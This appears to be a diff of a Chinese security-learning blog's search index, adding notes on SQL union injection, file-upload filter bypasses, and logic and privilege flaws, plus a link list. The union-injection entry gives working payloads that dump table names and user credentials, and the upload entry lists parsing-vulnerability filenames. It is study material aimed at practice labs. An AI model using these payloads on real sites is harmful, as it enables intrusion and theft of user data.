-<h2 id="2-后端黑名单绕过"><a href="#2-后端黑名单绕过" class="headerlink" title="2.后端黑名单绕过"></a>2.后端黑名单绕过</h2><p>文件上传常见验证方式：</p>
-<p>后缀名：黑名单(明确不让上传的格式后缀)、白名单(允许可上传的格式后缀，相对来说安全性高点)</p>
-<p>文件类型：MIME信息(Content-type的值)</p>
-<p>文件头：内容头信息，如gif的文件头是GIF89a</p>
-<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h4><p>upload-labs:<strong>Pass 1-12</strong></p>
-<p>简要上传表单代码分析解释 </p>
-<blockquote>
-<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
-<p>$_FILES[‘myfile’][‘name’]</p>
-<p>$_FILES[‘myfile’][‘size’]</p>
-<p>$_FILES[‘myfile’][‘type’]</p>
-</blockquote>
-<blockquote>
-<p>&lt;form …&gt;<br>    &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br>    …<br>&lt;&#x2F;form&gt;</p>
-</blockquote>
-<h2 id="3-内容逻辑数组绕过"><a href="#3-内容逻辑数组绕过" class="headerlink" title="3.内容逻辑数组绕过"></a>3.内容逻辑数组绕过</h2><h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><ul>
-<li>upload-labs:<strong>Pass 13-20</strong></li>
-<li>CVE-2017-12615-上传-Tomcat</li>
-<li>中间件解析漏洞+配合文件上传测试<ul>
-<li>IIS-上传-解析-(panfei806)</li>
-<li>Apache-上传-解析-vulhub</li>
-<li>Nginx-上传-解析-vulhub</li>
-</ul>
-</li>
-</ul>
-<h4 id="中间件解析漏洞："><a href="#中间件解析漏洞：" class="headerlink" title="中间件解析漏洞："></a>中间件解析漏洞：</h4><p>解析漏洞<br>    Nginx<br>        xxx.jpg%00.php(Nginx&lt;8.03 空字节代码执行漏洞)<br>        fix_pathinfo<br>            &#x2F;1.jpg&#x2F;1.php<br>            &#x2F;1.jpg%00.php<br>            &#x2F;1.jpg&#x2F;%20\0.php<br>    IIS<br>        IIS5.x-IIS6.x<br>            &#x2F;xx.asp&#x2F;xx.jpg<br>            xx.asp;jpg<br>            test.asa test.cer test.cdx<br>        IIS7.5<br>            a.aspx.a;a.aspx.jog.jpg<br>    apache<br>        test.php.php123  从右到左开始判断解析<br>        AddHandler php5-script.php     test2.php.jpg<br>        AddType application&#x2F;x-httpd-php .jpg     即使扩展名是jpg,一样能以php方式执行</p>
+    <title>sql注入之联合注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
+<p>union有一个十分严格的约束条件，因为是联合查询，必选保证字段数一致，即两个查询结果有相同的<strong>列数</strong>，因此我们后面要对字段数进行判断。</p>
+<p>mysql中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+<p>1、    判断注入点</p>
+<p>假如存在这么一个参数?id&#x3D;1，可以在参数后面加个单引号或者双引号看是否爆sql语法的错误</p>
+<p>2、    判断<strong>闭合</strong>形式</p>
+<p>主要是判断是否是<strong>整形</strong>闭合，还是字符型闭合，如果是字符型闭合 ，又看是否是<strong>单引</strong>号闭合、双引号闭合，或者是<strong>引号加括号</strong>的闭合形式。</p>
+<p>3、判断查询列数</p>
+<p>1’ order by 1–+</p>
+<p>当order by 3时排序第三个栏位回显正常，而order by 4回显错误，可以判断出当前sql语句向该表查询了三个字段。所以说orderby只是判断了当前sql语句查询的字段数，并不是判断Users表中有几个列，目的是为了符合union的用法，即有相同的字段数。</p>
+<p>4、判断显示位</p>
+<p>对于一个网页，如果它的列数有三列，但可能只有1，2列的数据返回页面前端。所以我们需要查询哪个列会回显，得用unionselect 1,2,3来查看回显位。</p>
+<p>常用语句为-1’ union select 1,2,3–+</p>
+<p>这里一定得是-1 union……，而不是1 union…..因为程序在展示数据的时候通常只会取结果集的第一行数据，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
+<p>只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了</p>
+<p>5、获取所有数据库名</p>
+<p>6、获取数据库所有表名</p>
+<p>7、获取字段名 </p>
+<p>8、获取字段中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3 and &#x27;1&#x27;=&#x27;1 库 //爆库</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 and &#x27;1&#x27;=&#x27;1 表	 //爆表</span><br><span class="line">?id=-1&#x27; union select 1, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 and &#x27;1&#x27;=&#x27;1 列							//爆列</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(&#x27;~&#x27;,username,password) from security.users ),3 and &#x27;1&#x27;=&#x27;1 字段					 //爆字段</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/qq_61237064/article/details/121758528?ops_request_misc=%7B%22request_id%22:%22168049213216800211546816%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168049213216800211546816&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-121758528-null-null.142%5Ev80%5Einsert_down38,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187">sql注入中的联合注入_ZredamanJ的博客-CSDN博客</a></p>
 ]]></content>
       <categories>
         <category>web漏洞</category>
-        <category>文件上传</category>
+        <category>sql注入</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>在线网址</title>
+    <url>/2023/05/13/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7/</url>
+    <content><![CDATA[<h2 id="一、在线工具"><a href="#一、在线工具" class="headerlink" title="一、在线工具"></a>一、在线工具</h2><p><a href="https://c.runoob.com/compile/1/">PHP 在线工具 | 菜鸟工具 (runoob.com)</a></p>
+<p><a href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode">Base64 编码&#x2F;解码 - 在线工具 (toolhelper.cn)</a></p>
+<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
+<h2 id="二、学习网址"><a href="#二、学习网址" class="headerlink" title="二、学习网址"></a>二、学习网址</h2><p><a href="https://www.vulhub.org.cn/search">漏洞检索 - VULHUB开源网络安全威胁库</a></p>
+<p><a href="https://www.freebuf.com/column/195521.html">https://www.freebuf.com/column/195521.html</a></p>
+<p><a href="http://xiaodi8.com/?id=25">http://xiaodi8.com/?id=25</a></p>
+<p><a href="https://xz.aliyun.com/t/6103">https://xz.aliyun.com/t/6103</a></p>
+<p><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
+<p>[Nessus安装与使用_nessus安装使用教程_@Camelus的博客-CSDN博客](<a href="https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&request_id=&biz_id=102&utm_term=windows">https://blog.csdn.net/m0_61506558/article/details/126803631?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows</a> nessus安装&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduweb~default-1-126803631.142^v87^control_2,239^v2^insert_chatgpt&amp;spm&#x3D;1018.2226.3001.4187)</p>
+<p><a href="https://bbs.zkaq.cn/">Track 安全社区 — 掌控安全在线教育- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></p>
+<p><a href="https://overthewire.org/wargames/natas/natas9.html">OverTheWire: Natas Level 8 → Level 9</a></p>
+<p><a href="https://www.52pojie.cn/forum.php">吾爱破解 - LCG - LSG|安卓破解|病毒分析|www.52pojie.cn</a></p>
+<p><a href="https://blog.csdn.net/weixin_44211968/article/details/124696627?ops_request_misc=%7B%22request_id%22:%22168441788816800211527620%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168441788816800211527620&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124696627-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7&spm=1018.2226.3001.4187">【Web 安全】XSS 攻击详解_xss攻击_想变厉害的大白菜的博客-CSDN博客</a></p>
+<p>pikachu靶场 <a href="http://t.csdn.cn/fhhlu">http://t.csdn.cn/fhhlu</a></p>
+<p>乌云社区</p>
+<p>先知社区</p>
+<p><a href="https://blog.csdn.net/qq_45894840/article/details/123613510?ops_request_misc=&request_id=&biz_id=102&utm_term=hackthebox&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-123613510.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) hackthebox的网站使用教程_Ba1_Ma0的博客-CSDN博客</a></p>
+<h2 id="三、学习平台"><a href="#三、学习平台" class="headerlink" title="三、学习平台"></a>三、学习平台</h2><p>xss接收平台:<a href="https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
+<p>dnslog平台:<a href="http://ceye.io/">http://ceye.io/</a></p>
+]]></content>
+      <categories>
+        <category>在线工具</category>
+        <category>学习网址</category>
+      </categories>
+      <tags>
+        <tag>编译</tag>
+        <tag>加密解密</tag>
+        <tag>其它工具</tag>
+        <tag>学习网址</tag>
       </tags>
   </entry>
   <entry>
@@ -1601,7 +1846,11 @@ echo $get
     <url>/2023/05/13/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
     <content><![CDATA[<h2 id="一、基本流程"><a href="#一、基本流程" class="headerlink" title="一、基本流程"></a>一、基本流程</h2><p>目标确认-&gt;信息收集-&gt;漏洞发现-&gt;漏洞利用-&gt;权限维持、内网渗透-&gt;目标获取、痕迹清理</p>
 <h3 id="1、目标确认"><a href="#1、目标确认" class="headerlink" title="1、目标确认"></a>1、目标确认</h3><p>要获取到什么权限</p>
-<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
+<h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>基础设施枚举（获取公司在互联网和内部网上的位置；确定公司的安全措施）</p>
+<p>服务枚举（服务版本、服务信息；许多服务有版本历史记录，可以识别主机或服务器上安装的版本是否是真的或新的）</p>
+<p>主机枚举（确定该主机或服务器扮演什么角色以及它与哪些网络组件通信。此外，确定所用服务及用途，以及端口。）</p>
+<p>掠夺（获取敏感信息如员工姓名、客户数据【需要在目标主机上获取到访问权限】）</p>
+<p>域名、IP、端口、服务端框架、语言、开源情报、防御措施等</p>
 <h4 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h4><p>正向记录(mx,ns,txt,spf,cname)</p>
 <p>反向查询(whois信息反查:电话、邮箱、姓名)</p>
 <p>备案信息</p>
@@ -1611,12 +1860,82 @@ echo $get
 <p>代码审计0day</p>
 <h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>拖库、提权（写文件webshell、MYSQL UDF、sqlserver xp_cmdshell）</p>
 <h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>打管理员cookie、beef框架攻击管理员客户端</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230603172605460.png"></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
       </categories>
       <tags>
         <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传综述</title>
+    <url>/2023/05/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%BC%E8%BF%B0/</url>
+    <content><![CDATA[<h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>文件上传<br>    初识<br>        意义<br>        危害<br>        查找&#x2F;判断方式<br>        注意点<br>        实际应用说明<br>    验证&#x2F;绕过<br>        前端<br>            JS类防护<br>        后端<br>            黑名单<br>                特殊解析后缀<br>                .htaccess解析<br>                大小写绕过<br>                点绕过<br>                空格绕过<br>                ::$$DATA绕过<br>                配合解析漏洞<br>                双后缀名绕过<br>            白名单<br>                MIME绕过<br>                %00截断：在url中%00表示ascii码的0，表示字符串结束。（php版本&lt;5.3.4吧）<br>                0x00截断<br>                0x0a截断<br>            内容及其他<br>                文件头检测<br>                二次渲染<br>                条件竞争<br>                突破getimagesize<br>                突破exif_imagetype<br>    漏洞&#x2F;修复<br>        解析漏洞<br>            IIS6&#x2F;7.X<br>            Apache<br>            Nginx<br>        CMS漏洞<br>            子主题 1<br>            子主题 2<br>            子主题 3<br>        其他漏洞<br>            编辑器漏洞<br>                fackeditor<br>                ewebeditor<br>                ckeditor<br>                kindedit<br>                …<br>            CVE漏洞<br>            安全修复<br>    WAF绕过<br>        safadog<br>        BT<br>        XXX云盾</p>
+<p><strong>利用思路</strong></p>
+<p>常规类</p>
+<p>​	扫描获取上传</p>
+<p>​	会员中心上传</p>
+<p>​	后台系统上传</p>
+<p>​	各种途径上传</p>
+<p>CMS类</p>
+<p>​	CMS源码</p>
+<p>编辑器类</p>
+<p>​	ckeditor</p>
+<p>​    ewebeditor<br>​			ckeditor<br>​			kindedit</p>
+<p>其他&#x2F;CVE</p>
+<p>​	平台审计</p>
+<p>​	第三方</p>
+<h2 id="1-基础与过滤方式"><a href="#1-基础与过滤方式" class="headerlink" title="1.基础与过滤方式"></a>1.基础与过滤方式</h2><p>是什么：程序对文件的上传没有全面的限制，导致用户可以上传一些超越用户权限的一些文件，如木马,shell脚本,病毒等。</p>
+<p>文件上传利用前提:1.能上传上去；2.文件能被解析；3.知道绝对<strong>路径</strong>且能访问 </p>
+<p>危害：获取到网站权限，进而获取数据。即通过该漏洞上传webshell后门。</p>
+<p>查找&#x2F;判断：1.目录扫描找到上传地址</p>
+<p>​					2.会员中心</p>
+<p>​					3.后台</p>
+<p>​					4.白盒：拿到源代码找漏洞</p>
+<p>注意点：拿到漏洞，要对漏洞类型进行区分</p>
+<p>实际应用说明：上传后门脚本获取网站权限</p>
+<h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><ul>
+<li>常规文件上传地址的获取说明	：工具扫描</li>
+<li>不同格式下的文件类型后门测试：这个要结合自己的木马类型，如果是php，你连接地址为..&#x2F;1.jpg，显示是不符合的。(.htacess另说)</li>
+<li>配合解析漏洞下的文件类型后门测试本地文件：上传+解析漏洞</li>
+<li>upload-labs</li>
+<li>CMS&#x2F;CVE上传漏洞复现</li>
+</ul>
+<h2 id="2-后端黑名单绕过"><a href="#2-后端黑名单绕过" class="headerlink" title="2.后端黑名单绕过"></a>2.后端黑名单绕过</h2><p>文件上传常见验证方式：</p>
+<p>后缀名：黑名单(明确不让上传的格式后缀)、白名单(允许可上传的格式后缀，相对来说安全性高点)</p>
+<p>文件类型：MIME信息(Content-type的值)</p>
+<p>文件头：内容头信息，如gif的文件头是GIF89a</p>
+<h4 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例:"></a>演示案例:</h4><p>upload-labs:<strong>Pass 1-12</strong></p>
+<p>简要上传表单代码分析解释 </p>
+<blockquote>
+<p>$_FILES[表单中参数名][文件自带属性如(name&#x2F;type&#x2F;size)]</p>
+<p>$_FILES[‘myfile’][‘name’]</p>
+<p>$_FILES[‘myfile’][‘size’]</p>
+<p>$_FILES[‘myfile’][‘type’]</p>
+</blockquote>
+<blockquote>
+<p>&lt;form …&gt;<br>    &lt;input class&#x3D;”input_file” type&#x3D;”file” name&#x3D;”myfile”&#x2F;&gt;<br>    …<br>&lt;&#x2F;form&gt;</p>
+</blockquote>
+<h2 id="3-内容逻辑数组绕过"><a href="#3-内容逻辑数组绕过" class="headerlink" title="3.内容逻辑数组绕过"></a>3.内容逻辑数组绕过</h2><h4 id="演示案例：-1"><a href="#演示案例：-1" class="headerlink" title="演示案例："></a>演示案例：</h4><ul>
+<li>upload-labs:<strong>Pass 13-20</strong></li>
+<li>CVE-2017-12615-上传-Tomcat</li>
+<li>中间件解析漏洞+配合文件上传测试<ul>
+<li>IIS-上传-解析-(panfei806)</li>
+<li>Apache-上传-解析-vulhub</li>
+<li>Nginx-上传-解析-vulhub</li>
+</ul>
+</li>
+</ul>
+<h4 id="中间件解析漏洞："><a href="#中间件解析漏洞：" class="headerlink" title="中间件解析漏洞："></a>中间件解析漏洞：</h4><p>解析漏洞<br>    Nginx<br>        xxx.jpg%00.php(Nginx&lt;8.03 空字节代码执行漏洞)<br>        fix_pathinfo<br>            &#x2F;1.jpg&#x2F;1.php<br>            &#x2F;1.jpg%00.php<br>            &#x2F;1.jpg&#x2F;%20\0.php<br>    IIS<br>        IIS5.x-IIS6.x<br>            &#x2F;xx.asp&#x2F;xx.jpg<br>            xx.asp;jpg<br>            test.asa test.cer test.cdx<br>        IIS7.5<br>            a.aspx.a;a.aspx.jog.jpg<br>    apache<br>        test.php.php123  从右到左开始判断解析<br>        AddHandler php5-script.php     test2.php.jpg<br>        AddType application&#x2F;x-httpd-php .jpg     即使扩展名是jpg,一样能以php方式执行</p>
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>文件上传</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
       </tags>
   </entry>
   <entry>
@@ -1718,6 +2037,86 @@ echo $get
       </categories>
       <tags>
         <tag>网安</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑越权</title>
+    <url>/2023/05/22/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="1-水平垂直越权"><a href="#1-水平垂直越权" class="headerlink" title="1.水平垂直越权"></a>1.水平垂直越权</h1><p>垂直越权访问指：使用低权限身份的账号，能发送高权限账号才能有的请求，获得其高权限的操作。</p>
+<p>水平越权访问指：某用户能获取另一个同级别用户的操作</p>
+<p>未授权访问：通过删除请求中的认证信息后重放该请求，依然可以完成操作（任何人都可以操作它）</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li><p>前端安全造成：界面；</p>
+<p>判断用户等级后，代码界面部分进行可选显示。</p>
+<p>纠正：根据用户等级，应该判断某些功能执不执行；给不给显示<strong>不等于</strong>功能没有</p>
+</li>
+<li><p>后端安全造成：数据库；</p>
+<p>​	user表（管理员与普通用户同表）</p>
+<p>​			id,username,password,usertype</p>
+<p>​			1,	admin	, 12321321, 	1</p>
+<p>​			2,	test		,	1211111,	2</p>
+<p>代码通过usertype验证级别。</p>
+<p><strong>如果在访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本。</strong></p>
+</li>
+</ul>
+<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>pikachu：只判断了登录状态，没有验证级别，因此存在越权</p>
+<p>越权检测（小米范工具）</p>
+<p>越权检测（burpsuite的插件Authz）</p>
+<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>注册用户时，提示该用户已存在，就可以尝试利用该用户名。</p>
+<p>垂直越权：添加用户的前提：</p>
+<p>普通用户前端有操作界面可以抓取数据包</p>
+<p>通过网站源码本地搭建自己模拟抓取</p>
+<p>盲猜</p>
+<p>重点关注：url参数和cookie参数如(uid、id)</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>前后端同时对用户输入信息校验</p>
+<p>调用功能（执行关键操作）前验证用户是否有该权限</p>
+<p>直接对象引用的加密资源ID、防止攻击者枚举ID、敏感数据特殊化处理</p>
+<p>永远不要相信用户的输入，对于可控参数进行严格检查与过滤</p>
+<h1 id="2-登录脆弱及支付篡改"><a href="#2-登录脆弱及支付篡改" class="headerlink" title="2.登录脆弱及支付篡改"></a>2.登录脆弱及支付篡改</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><p>超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。</p>
+<p>安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。HTTPS加密过程：</p>
+<ol>
+<li><p><strong>客户端发起HTTPS请求</strong></p>
+</li>
+<li><p><strong>服务器回复公共证书</strong>（采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，<strong>这套证书相当于公钥和私钥</strong>）</p>
+</li>
+<li><p><strong>客户端解析证书</strong>（这部分工作由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>
+<p>如果证书没有问题，那么<strong>就生成一个随机值，然后用证书对该随机值进行加密</strong>，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容）</p>
+</li>
+<li><p><strong>传送加密信息</strong>（<strong>传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值</strong>，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了）</p>
+</li>
+<li><p><strong>服务器端解密信息</strong>（服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后<strong>把内容通过该值</strong>进行<strong>对称加密</strong>，即将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全）</p>
+</li>
+<li><p><strong>服务器端传输加密后的信息</strong></p>
+</li>
+<li><p><strong>客户端解密信息</strong>（客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容）</p>
+</li>
+</ol>
+<h3 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h3><p>是在传输通信协议（TCP&#x2F;IP）上实现的一种安全协议，采用公开密钥技术，SSL广泛支持各种类型的网络，同时提供三种基本的安全服务，它们都使用公开密钥技术。</p>
+<p>其作用为：</p>
+<p>（1）、认证用户和服务器，确保数据发送到正确的客户机和服务器；</p>
+<p>（2）、加密数据以防止数据中途被窃取；</p>
+<p>（3）、维护数据的完整性，确保数据在传输过程中不被改变。</p>
+<h3 id="商品业务"><a href="#商品业务" class="headerlink" title="商品业务"></a>商品业务</h3><p>参考网站：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
+<h4 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h4><p>选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单编号-&gt;订单支付选择-&gt;完成支付</p>
+<h4 id="常见篡改参数"><a href="#常见篡改参数" class="headerlink" title="常见篡改参数"></a>常见篡改参数</h4><p>商品编号ID，购买价值，购买数量，支付方式，订单号，支付状态等</p>
+<h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
+<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p>HTTP&#x2F;HTTPS协议密文抓取：f12或bp</p>
+<p>后台登录账号密码爆破测试：指弱口令爆破，一般已知账号，爆破密码，如果加密，找到加密的算法。</p>
+<p>Cookie脆弱点验证修改测试：如Cookie:user&#x3D;1;</p>
+<ol>
+<li>登录点暴力破解</li>
+<li>HTTP&#x2F;HTTPS传输</li>
+<li>Cookie脆弱点验证</li>
+<li>Session固定点测试</li>
+<li>验证密文比对安全测试</li>
+</ol>
+<h1 id="3-找回机制及接口安全"><a href="#3-找回机制及接口安全" class="headerlink" title="3.找回机制及接口安全"></a>3.找回机制及接口安全</h1><h1 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h1>]]></content>
+      <categories>
+        <category>逻辑越权</category>
+        <category>WEB漏洞</category>
+      </categories>
+      <tags>
+        <tag>逻辑越权</tag>
       </tags>
   </entry>
   <entry>
